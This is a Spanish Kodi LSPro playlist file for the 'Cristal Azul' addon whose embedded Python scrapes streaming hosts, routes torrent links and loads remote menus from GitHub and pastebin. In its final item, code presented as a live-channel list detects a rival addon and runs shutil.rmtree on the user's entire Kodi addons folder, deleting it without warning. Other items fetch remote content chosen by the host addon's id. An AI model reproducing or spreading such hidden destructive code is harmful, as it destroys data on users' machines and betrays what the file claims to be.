<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<items>













<item>
<title>[COLOR white]probando Servidores conector mas bingo...import[/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<regex>
<name>link_final</name>
<expres><![CDATA[#$pyFunction
import xbmc , xbmcaddon , xbmcgui
def GetLSProData(page_data,Cookie_Jar,m):
    teclado = xbmcgui.Dialog()
    Respuesta_Buscador = teclado.input('Inserte su enlace', type=xbmcgui.INPUT_ALPHANUM)
    return Respuesta_Buscador
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
#url = 'https://playtube.ws/embed-dtu4jqglhr4r.html'
#url = '$doregex[link_final]'
#url = 'https://files.grantorrent.nl/torrents/peliculas/Otra-vuelta-de-tuerca-(The-Turning)-(2020).avi53.torrent'
url = 'magnet:?xt=urn:btih:f0987e7751f1445bb972bf6341dbe91ba1f8ee52'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves.urllib_parse import urlencode
from six.moves import urllib_parse
try:
    from lib.megaserver import Client
except:
    from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cLrJIhsDApL
 
  if 'gamovideo' in url:
    try:
        if 'embed' and 'html' in url:
            url = url.replace('embed-', '')
            url = six.ensure_str(url)
            url = url.split('-')[0]
        else:
            url = url
        ua = AgenteCristal()
        headers = {"User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Alt-Used": "gamovideo.com:443","Upgrade-Insecure-Requests": "1","Cache-Control": "max-age=0", "cookie": "gam=1"}
        source = requests.get(url, headers=headers, verify=False).text
        source = six.ensure_str(source)
        #ArchivoDestino = xbmc.translatePath('special://home/addons/plugin.video.cristalazul/')
        #open(ArchivoDestino + 'gamovideo.txt','wb').write(six.ensure_binary(source))
        pack = re.findall('javascript.*?(eval\(function\(p,a,c,k,e,d.*)', source)[0]
        unpack = six.ensure_str(jsunpack.unpack(pack)).replace('\\', '')    
        u = re.findall('file:\s*"(http.*?)"', unpack)[0]
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
            #u = xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]enlace caido [/COLOR], 4000)")
    return u
  elif '.torrent' in url or 'magnet:' in url:
    addon = xbmcaddon.Addon('plugin.video.cristalazul')
    elecion_torrent = addon.getSetting('TodosTorrent')
    if 'Ninguno' == elecion_torrent:
      lanzar_horus = 'plugin://script.module.horus/?{}'.format(urlencode({'url': url, 'action': 'play', 'title': 'titulo', 'iconimagen': 'https://i.imgur.com/bg6n3AV.png'}))
      dialog = xbmcgui.Dialog()
      ret = dialog.select('Reproducir con:', ['[COLOR white]Horus[/COLOR]', '[COLOR white]Torrest[/COLOR]', '[COLOR white]Elementum[/COLOR]', '[COLOR white]Quasar[/COLOR]'])
      channels = [
   lanzar_horus,
   'torrest',
   'plugin://plugin.video.elementum/play?uri='+url+'&image=imageurl&player=0',
   'plugin://plugin.video.quasar/play?uri='+url+'&image=imageurl&player=0']  
      elegido = channels[ret]
      if elegido == 'torrest':
        if '.torrent' in url:
          return 'plugin://plugin.video.torrest/play_url?url='+url
        else:
          return 'plugin://plugin.video.torrest/play_magnet?magnet='+url
      else:
        return elegido
    elif 'Horus' == elecion_torrent:
      lanzar_horus = 'plugin://script.module.horus/?{}'.format(urlencode({'url': url, 'action': 'play', 'title': 'titulo', 'iconimagen': 'https://i.imgur.com/bg6n3AV.png'}))
      return lanzar_horus
    elif 'Torrest' == elecion_torrent or 'Torrets' in elecion_torrent:
      if '.torrent' in url:
        return 'plugin://plugin.video.torrest/play_url?url='+url
      else:
        return 'plugin://plugin.video.torrest/play_magnet?magnet='+url
    elif 'Elementum' == elecion_torrent:
      return 'plugin://plugin.video.elementum/play?uri='+url+'&image=imageurl&player=0'
    else:
      return 'plugin://plugin.video.quasar/play?uri='+url+'&image=imageurl&player=0'
  elif 'supervideo.tv' in url:
    try:
        ua = AgenteCristal()
        s=requests.session()
        rsource=s.get(url, headers={'User-Agent': ua},  verify=False)
        source=s.get(url, headers={'User-Agent': ua},  verify=False)
        pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', six.ensure_str(source.text))[0]
        unpack=jsunpack.unpack(pack)
        u = re.findall('file:\s*"(http.{0,100}mp4)"', unpack)[0]+'|User-Agent='+ua
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'playtube' in url:
    try:
        ua = AgenteCristal()
        headers = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Connection": "keep-alive", "Cookie": "__cfduid=da51f45f7beab65cb44b9e443a004804e1619374179; file_id=2205817; aff=5126; _ym_uid=1619374410338696248; _ym_d=1619374410; _ym_isad=2"}
        source = requests.get(url, headers=headers, verify=False).text
        source = six.ensure_str(source)
        ArchivoDestino = xbmc.translatePath('special://home/addons/plugin.video.cristalazul/')
        #open(ArchivoDestino + 'playtube.txt','wb').write(six.ensure_binary(source))
        pack = re.findall('javascript.*?(eval\(function\(p,a,c,k,e,d.*)', source)[0]
        unpack = six.ensure_str(jsunpack.unpack(pack)).replace('\\', '')    
        u = re.findall('file:\s*"(http.*?)"', unpack)[0]
        u = six.ensure_str(u.replace('/hls/,', '/hls/').replace(',.urlset/master.m3u8', '/index-v1-a1.m3u8')) + '|User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0&Origin=https://playtube.ws&Referer=https://playtube.ws/&Host=karma.tubecdn.co'
        open(ArchivoDestino + 'playtube.txt','wb').write(six.ensure_binary(u))
        return u
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

  elif 'mixdrop' in url:
    url = url.replace('/f/','/e/').replace('.co','.to')
    try:
        ua = AgenteCristal()
        scraper = cfscrape.create_scraper()
        source=scraper.get(url, headers={'User-Agent':ua}, verify=False)
        source_text = six.ensure_str(source.text)
        if 'eval(function' in source_text:
          try:
            u = resolveurl.resolve(url)
          except:
            pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', source_text)[0]
            unpack=jsunpack.unpack(pack)
            u = 'https:' + re.findall('wurl="(.*?)"', unpack)[0]
          return u
        else:
          source2 = 'https://mixdrop.to' + re.findall('"(.*?)\"',source_text)[0] + 'https://mixdrop.to/'
          source3 = scraper.get(source2, headers={'User-Agent':ua}, verify=False)
          pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', six.ensure_str(source3.text))[0]
          unpack=jsunpack.unpack(pack)
          return 'https:' + re.findall('wurl="(.*?)"', unpack)[0]
    except:
      try:
          u = resolveurl.resolve(url)
      except Exception as e:
          u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
      return u

  elif 'google' in url:
    try:
        id = re.findall("([-\w]{25,})", url)[0]
        u = 'plugin://plugin.video.gdrive/?mode=video&amp;instance=gdrive1&amp;filename=' + id + '&amp;content_type=video'
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

  elif 'dailymotion' in url:
    try:
        url = 'https://www.dailymotion.com/embed/video/'+url.split('/')[-1]
        m3u8 = re.findall('URL"."url":"(.*?)"',six.ensure_str(requests.get(url,headers={'user-agent':'ipad'},verify=False).content))[0].replace('\/', '/')
        return re.findall('\s*(h.*?)\s',six.ensure_str(requests.get(m3u8,headers={'user-agent':'ipad'},verify=False).content))[-1]
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

  elif 'mega' in url:
    try:
      video_urls = []


      c = Client(url=url.replace('/file/','/embed#!').replace('/embed/','/embed#!').replace('#!#!','#!'), 
      is_playing_fnc=xbmc.Player().isPlaying())
      files = c.get_files()

      if len(files) > 5:
        media_url = c.get_play_list()
        video_urls.append([get_filename_from_url(media_url)[-4:], media_url])
      else:
        for f in files:
            media_url = f["url"]
            video_urls.append([get_filename_from_url(media_url)[-4:], media_url])

      return video_urls[0][1]
    except Exception as e:
        return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))

  elif 'clipwatching' in url:
    try:
        ua = AgenteCristal()
        u = re.findall('sources:.*?"(.*?)"',six.ensure_str(requests.get(url,headers={'user-agent':ua},verify=False).content))[0] + '|User-Agent=' + AgenteCristal()
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'cloudvideo' in url:
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cloudvideo.tv/'}, timeout=10, verify=False).content
        response = six.ensure_str(response)
        datos = re.findall('(?s)name="op" value="(.*?)".*?name="usr_login" value="(.*?)".*?name="id" value="(.*?)".*?name="fname" value="(.*?)".*?name="hash" value="(.*?)".*?name="imhuman" value="(.*?)"', response)
        source=requests.post(url,headers={'User-Agent':'Mozilla/5.0','referer':url},data={'op':datos[0][0],'usr_login':datos[0][1],'id':datos[0][2],'fname':urllib_parse.quote_plus(datos[0][3]),'referer':'','hash':datos[0][4],'imhuman':urllib_parse.quote_plus(datos[0][5])}).text
        source = six.ensure_str(source)
        pack = re.findall('javascript.*?(eval\(function\(p,a,c,k,e,d.*)', source)[0]
        unpack=jsunpack.unpack(pack)
        xbmc.log('miraaaaaaa: %s' % (unpack), xbmc.LOGNOTICE)
        u = re.findall('src:"(.*?)"', unpack)[0]
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'vidoza' in url:
    try:
        mozhdr4 = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        html4 = requests.get(url, headers=mozhdr4, verify=False).text
        html4 = six.ensure_src(html4)
        u = re.findall('["\']?\s*(?:file|src)\s*["\']?\s*[:=,]?\s*["\'](?P<url>[^"\']+)(?:[^}>\]]+)["\']?\s*res', html4)[0] + '|User-Agent=' + AgenteCristal()
    except:
        u = xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]enlace caido [/COLOR], 4000)")
    return u
  elif 'gloria' in url:
    try:
        mozhdr4 = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        html4 = requests.get(url, headers=mozhdr4, verify=False).text
        html4 = six.ensure_src(html4)
        u = re.findall('(?:file|src)\s*=["\'](http.*?)["\']', html4)[0].replace('&amp;','&') + '|User-Agent=' + AgenteCristal()
    except Exception as e:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'videobin' in url:
    try:
        u = url.replace('.html', '.ogg') + '|User-Agent=' + AgenteCristal()
    except Exception as e:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'ulozto' in url:
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Referer': 'https://uloz.to/'}
    page = requests.get(url, headers=headers, cookies=Cookie_Jar).content
    page = six.ensure_src(page)
    try:
      eurl = re.findall('getPreviewURL":"(.*?)"', page)[0]
      eurl = 'https://uloz.to' + eurl.replace('\/','/')
      url = requests.get(eurl, headers=headers, cookies=Cookie_Jar).json()['streamPreviewUrl']
      u='{}|{}'.format(url, urllib_parse.urlencode(headers))
    except:
      try:
        u = 'https:' + re.findall('URL":"(.*?)"', page)[0].replace('\/','/')
      except Exception as e:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'flixplayer' in url:
    try:
        ua = AgenteCristal()
        u = re.findall('link":"(.*?mp4)"',six.ensure_str(requests.get(url,headers={'user-agent':ua},verify=False).content))[0] + '|User-Agent=' + AgenteCristal()
    except:
        try:
            Link = re.findall('link":"(.*?)"',six.ensure_str(requests.get(url,headers={'user-agent':ua},verify=False).content))[0].replace('embed-','')
            u = resolveurl.resolve(Link)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'openload' in url:
    try:
        mozhdr = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Servidor Openload muerto [/COLOR], 4000)")
    except:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Servidor Openload muerto [/COLOR], 4000)")
    return u
  elif 'uptobox' in url:
    try:
        mozhdr3 = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        html3 = requests.get(url, headers=mozhdr3, verify=False).text
        html3 = six.ensuere_str(html3)
        part1 = re.findall('(by its owner|uploaded with File Uploader)', html3)[0]
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    except:
        H = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul_[COLOR gold]Uptobox[/COLOR],[COLOR gold]Limite 120minutos diarios con esta ip[/COLOR], 5000)")
        u = resolveurl.resolve(url)
    return u
  else:
    try:
        u = resolveurl.resolve(url)
    except:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

def get_filename_from_url(url=url.replace('/file/','/embed#!').replace('/embed/','/embed#!').replace('#!#!','#!')):
    parsed_url = urllib_parse.urlparse(url)
    try:
        filename = parsed_url.path
    except:
        if len(parsed_url) >= 4:
            filename = parsed_url[2]
        else:
            filename = ""

    if "/" in filename:
        filename = filename.split("/")[-1]

    return filename

def AgenteCristal():
    url= 'https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/AgenteCristal'
    agente = {'User-Agent': 'Mozilla/5.0'}
    extraer = requests.get(url, headers=agente)
    AgenteCristal = re.findall("(.*?)CRISTAL", six.ensure_str(extraer.text))[0]
    return AgenteCristal
 
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
 import re,requests,os
 from kodi_six import xbmc,xbmcaddon
 id = xbmcaddon.Addon().getAddonInfo('id')
 if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
        return requests.get('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/Importar.entero.distandia', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://github.com'}, verify=False).text
 else:
        return requests.get('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/importar.robado', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://github.com'}, verify=False).text
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/r6aXooD.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item> 










<item>
<title>[COLOR white]b España[/COLOR]</title>
<link>$doregex[lista]</link>
<regex>
<name>lista</name>
<listrepeat><![CDATA[
<title>[lista.param3]  [COLOR white][lista.param1][/COLOR]</title>
<link>$doregex[m3u8]|User-Agent=Mozilla/5.0</link>
<thumbnail>https:[lista.param2]</thumbnail>	
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres>(?s)title="(.*?)".*?src="(.*?)".*?href="(.*?)"</expres>
<page>$doregex[corte_lista]</page>
</regex>
<regex>
<name>corte_lista</name>
<expres>(?s)id="content1">(.*?)section</expres>
<page>https://photocall.tv/</page>
</regex>
<regex>
<name>m3u8</name>
<expres><![CDATA[#$pyFunction
url = "$doregex[seleccion]"
import re,requests,base64,six
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl

    solicitud = requests.get(url, headers={'User-Agent': 'Mozilla/5.0', 'referer': 'https://photocall.tv/'}, verify=False).text
    solicitud = six.ensure_str(solicitud)
    if 'window.atob' in solicitud:
        data = re.findall("""window.*?["'](.*?)["']""", solicitud)[0]
        url = base64.b64decode(data)
        url = six.ensure_str(url)
    else:
        url = re.findall("""source.*?["'](http.*?)["']""", solicitud)[0]
    if "m3u8" in url:
        url = url
    else:
        url = 'https://photocall.tv/' + url
    return url
]]></expres>
<page></page>
</regex>
<regex>
<name>seleccion</name>
<expres><![CDATA[#$pyFunction
url = "[lista.param3]"
import re
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl

    texto_atres = """[{"id":"5a6b32667ed1a834493ec03b","title":"ATRESplayer","link":{"url":"/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6b32667ed1a834493ec03b","pageType":"CHANNEL"}},{"id":"5a6a165a7ed1a834493ebf6a","title":"Antena 3","link":{"url":"/antena3/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a165a7ed1a834493ebf6a","pageType":"CHANNEL"}},{"id":"5a6a172c7ed1a834493ebf6b","title":"laSexta","link":{"url":"/lasexta/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a172c7ed1a834493ebf6b","pageType":"CHANNEL"}},{"id":"5a6a17da7ed1a834493ebf6d","title":"Neox","link":{"url":"/neox/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a17da7ed1a834493ebf6d","pageType":"CHANNEL"}},{"id":"5a6a180b7ed1a834493ebf6e","title":"Nova","link":{"url":"/nova/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a180b7ed1a834493ebf6e","pageType":"CHANNEL"}},{"id":"5a6a18357ed1a834493ebf6f","title":"Mega","link":{"url":"/mega/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a18357ed1a834493ebf6f","pageType":"CHANNEL"}},{"id":"5a6a189a7ed1a834493ebf70","title":"Atreseries","link":{"url":"/atreseries/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a189a7ed1a834493ebf70","pageType":"CHANNEL"}},{"id":"5b0bd5b57ed1a850409cb439","title":"Flooxer","link":{"url":"/flooxer/","href":"https://api.atresplayer.com/client/v1/page/channel/5b0bd5b57ed1a850409cb439","pageType":"CHANNEL"}},{"id":"5b0bd45a7ed1a850409cb435","title":"Novelas Nova","link":{"url":"/novelas-nova/","href":"https://api.atresplayer.com/client/v1/page/channel/5b0bd45a7ed1a850409cb435","pageType":"CHANNEL"}},{"id":"5f69bd317ed1a83f0b8eadf0","title":"Kidz","link":{"url":"/kidz/","href":"https://api.atresplayer.com/client/v1/page/channel/5f69bd317ed1a83f0b8eadf0","pageType":"CHANNEL"}}]"""
    if url.split('=')[1] in texto_atres:
        expres = url.split('=')[1] + '.*?channel/(.*?)"'
        url = 'https://api.atresplayer.com/player/v1/live/' + re.findall(expres, texto_atres)[0]
    else:
        url = url
    if "http" in url:
        url = url
    else:
        url = 'https://photocall.tv/' + url
    return url
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/rVVnm10.png</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
</item>







<item>
<title>[COLOR white]g España[/COLOR]</title>
<link>$doregex[lista]</link>
<regex>
<name>lista</name>
<listrepeat><![CDATA[
<title>[COLOR white][lista.param1][/COLOR]</title>
<link>$doregex[m3u8]|User-Agent=Mozilla/5.0</link>
<thumbnail>https:[lista.param2]</thumbnail>	
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres>(?s)title="(.*?)".*?src="(.*?)".*?href="(.*?)"</expres>
<page>$doregex[corte_lista]</page>
</regex>
<regex>
<name>corte_lista</name>
<expres>(?s)id="content1">(.*?)section</expres>
<page>https://photocall.tv/</page>
</regex>
<regex>
<name>m3u8</name>
<expres>source.*?["'](http.*?)["']</expres>
<page>$doregex[seleccion]</page>
<referer>https://photocall.tv/</referer>
</regex>
<regex>
<name>seleccion</name>
<expres><![CDATA[#$pyFunction
url = "[lista.param3]"
import re
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl

    texto_atres = """[{"id":"5a6b32667ed1a834493ec03b","title":"ATRESplayer","link":{"url":"/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6b32667ed1a834493ec03b","pageType":"CHANNEL"}},{"id":"5a6a165a7ed1a834493ebf6a","title":"Antena 3","link":{"url":"/antena3/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a165a7ed1a834493ebf6a","pageType":"CHANNEL"}},{"id":"5a6a172c7ed1a834493ebf6b","title":"laSexta","link":{"url":"/lasexta/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a172c7ed1a834493ebf6b","pageType":"CHANNEL"}},{"id":"5a6a17da7ed1a834493ebf6d","title":"Neox","link":{"url":"/neox/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a17da7ed1a834493ebf6d","pageType":"CHANNEL"}},{"id":"5a6a180b7ed1a834493ebf6e","title":"Nova","link":{"url":"/nova/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a180b7ed1a834493ebf6e","pageType":"CHANNEL"}},{"id":"5a6a18357ed1a834493ebf6f","title":"Mega","link":{"url":"/mega/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a18357ed1a834493ebf6f","pageType":"CHANNEL"}},{"id":"5a6a189a7ed1a834493ebf70","title":"Atreseries","link":{"url":"/atreseries/","href":"https://api.atresplayer.com/client/v1/page/channel/5a6a189a7ed1a834493ebf70","pageType":"CHANNEL"}},{"id":"5b0bd5b57ed1a850409cb439","title":"Flooxer","link":{"url":"/flooxer/","href":"https://api.atresplayer.com/client/v1/page/channel/5b0bd5b57ed1a850409cb439","pageType":"CHANNEL"}},{"id":"5b0bd45a7ed1a850409cb435","title":"Novelas Nova","link":{"url":"/novelas-nova/","href":"https://api.atresplayer.com/client/v1/page/channel/5b0bd45a7ed1a850409cb435","pageType":"CHANNEL"}},{"id":"5f69bd317ed1a83f0b8eadf0","title":"Kidz","link":{"url":"/kidz/","href":"https://api.atresplayer.com/client/v1/page/channel/5f69bd317ed1a83f0b8eadf0","pageType":"CHANNEL"}}]"""
    if url.split('=')[1] in texto_atres:
        expres = url.split('=')[1] + '.*?channel/(.*?)"'
        url = 'https://api.atresplayer.com/player/v1/live/' + re.findall(expres, texto_atres)[0]
    else:
        url = url
    if "http" in url:
        url = url
    else:
        url = 'https://photocall.tv/' + url
    return url
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/rVVnm10.png</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
</item>







<item>
<title>[COLOR white]pruebas encriptado[/COLOR]</title>
<link>cristalazul</link>
<externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/pi</externallink>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>



<item>
<title>[COLOR white]Menu C.A especial[/COLOR]</title>
<link>cristalazul</link>
<externallink>https://pastebin.com/raw/prJ3nua4</externallink>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>


<item>
<title>[COLOR white]Menu C.A encriptado[/COLOR]</title>
<link>cristalazul</link>
<externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CRISTAL.MENUPRINCIPAL/prueba_menu_encriptado$$LSProEncKey= $$</externallink>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>


<item>
<title>[COLOR white]Menu C.A[/COLOR]</title>
<link>cristalazul</link>
<externallink>https://pastebin.com/raw/KrJetEJb</externallink>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>




<item>
<title>[COLOR white]megadede py3[/COLOR]</title>
<link>cristalazul</link>
<externallink>https://pastebin.com/raw/WzK5HAfu</externallink>
<thumbnail>https://i.imgur.com/yGTsSPk.jpg</thumbnail>
<fanart>https://i.imgur.com/bg6n3AV.png</fanart>
</item>






<item>
<title>[COLOR white]aa pruebas horus[/COLOR]</title>
<link>$doregex[llamada]</link>
<regex>
<name>llamada</name>
<expres><![CDATA[#$pyFunction
from kodi_six import xbmc,xbmcgui
from six.moves.urllib_parse import urlencode
from six.moves import urllib_parse
import six
def GetLSProData(page_data,Cookie_Jar,m,):#cPrLItsLTfakl

    id = xbmcgui.Dialog().input('Insertar Acestream: ', type=xbmcgui.INPUT_ALPHANUM)
    Acestream = six.ensure_str(id)
    if Acestream == '':
        Acestream = 'magnet:?xt=urn:btih:1adbaf3f59a5c9ad012ba25a2f6bcf93f6836e32'
    if '.torrent' in Acestream or 'magnet' in Acestream:
        id_url = 'url'
    else:
        id_url = 'id'
    lanzar_horus = 'plugin://script.module.horus/?{}'.format(urlencode({'action': 'play', id_url: Acestream, 'title': 'titulo', 'iconimagen': 'https://i.imgur.com/yGTsSPk.jpg'}))
    return lanzar_horus
]]></expres>
<page></page>
</regex>
<thumbnail></thumbnail>
<fanart></fanart>
</item>





<item>
<title>[COLOR white]a6 pruebas horus[/COLOR]</title>
<link>$doregex[llamada]</link>
<regex>
<name>llamada</name>
<expres><![CDATA[#$pyFunction
from kodi_six import xbmc,xbmcgui
from six.moves import urllib_parse
import six
def GetLSProData(page_data,Cookie_Jar,m,):#cPrLItsLTfakl

    id = xbmcgui.Dialog().input('Insertar Acestream: ', type=xbmcgui.INPUT_ALPHANUM)
    #Acestream = urllib_parse.quote_plus(six.ensure_str(id))
    Acestream = six.ensure_str(id)
    if Acestream == '':
        Acestream = '21740ae9cd48ab593e8470a657cf71a85e7a04e4'
    llamada = 'plugin://script.module.horus/?action=play&url=' + Acestream
    return llamada
]]></expres>
<page></page>
</regex>
<thumbnail></thumbnail>
<fanart></fanart>
</item>








<item>
<title>[COLOR gold]* [COLOR lightgreen]Cristal[COLOR white] (directos)[/COLOR]</title>
 <link>$doregex[makelist2]</link>
 <regex>
 <name>makelist2</name>
 <listrepeat><![CDATA[
<title>[COLOR lightskyblue][CAPITALIZE][makelist2.param1][/CAPITALIZE] - [COLOR white]$doregex[emitiendo][/COLOR]</title>
<link>$doregex[plugin]$doregex[depen]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m):
 
  try:
    estamos = xbmcaddon.Addon('plugin.video.blackghost')
    version = estamos.getAddonInfo('version')
    if '.' in version:
      addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
      shutil.rmtree(addon_path, ignore_errors=True)
      return 'https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5'
    else:
      xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
      return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
  except:
    id = xbmcaddon.Addon().getAddonInfo('id')
    if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
      past = urllib_request.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/DISTANCIA.D/PICADD').read()
      past = six.ensure_str(past)
      extraer = 'http://bit.ly/' + past[:1] + past[2:]
      extraer2 = urllib_request.urlopen(extraer).read()
      extraer2 = six.ensure_str(extraer2)
      return re.findall("""(?s)"name": "(.*?)".*?"image": "(.*?)".*?"url": "(.*?)"'.*?"embed": "(.*?)'""", extraer2)
    else:
      xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
      return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>emitiendo</name>
<expres><![CDATA[(?s)[makelist2.param4].*?ahora">\n\s\s\s(.*?)\n]]></expres>
<page>http://www.formulatv.com/programacion/movistarplus/</page>
</regex>
